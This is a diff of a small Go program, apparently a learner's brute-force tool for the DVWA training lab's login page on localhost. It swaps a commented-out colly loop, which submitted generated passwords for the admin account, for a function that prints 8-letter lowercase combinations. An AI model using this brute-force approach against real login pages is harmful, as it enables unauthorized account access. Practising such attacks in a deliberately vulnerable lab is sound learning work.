@@ -2,18 +2,32 @@ package main
 
 import (
 	"fmt"
+	"strings"
+	"klaidliadon.dev/next"
+	//"github.com/gocolly/colly"
+)
 
-	"github.com/gocolly/colly"
+var (
+	login = "admin"
+	password = "password"
 )
 
 func main() {
-	c := colly.NewCollector()
+	generate()
+	// c := colly.NewCollector()
 
-	c.OnHTML("div.vulnerable_code_area", func(h *colly.HTMLElement) {
-		fmt.Println("FOUND")
-	})
+	// c.OnHTML("div.vulnerable_code_area p", func(h *colly.HTMLElement) {
+	// 	fmt.Println(h.Text, "\nlogin:", login, "password:", password)
+	// })
 
-	c.Visit("http://localhost/DVWA-master/vulnerabilities/brute/")
+	// // c.OnRequest(func(r *colly.Request) {
+	// // 	fmt.Println("visiting", r.URL)
+	// // })
+
+	// for _, v := range generator(8){//[]string{"dfgfgfg", "dfdgfgg", "password"}{
+	// 	password = v
+	// 	c.Visit("http://localhost/DVWA-master/vulnerabilities/brute/?username=admin&password=" + v + "&Login=Login")
+	// }
 }
 
 func generator(maxChar int) []string {
@@ -30,4 +44,11 @@ func generator(maxChar int) []string {
 		next = last
 	}
 	return result
+}
+
+func generate() {
+	temp := strings.Split("abcdefghijklmnopqrstuvwxyz", "")
+	for v := range next.Combination([]interface{}{temp}, 8, true) {
+		fmt.Println(v)
+	}
 }
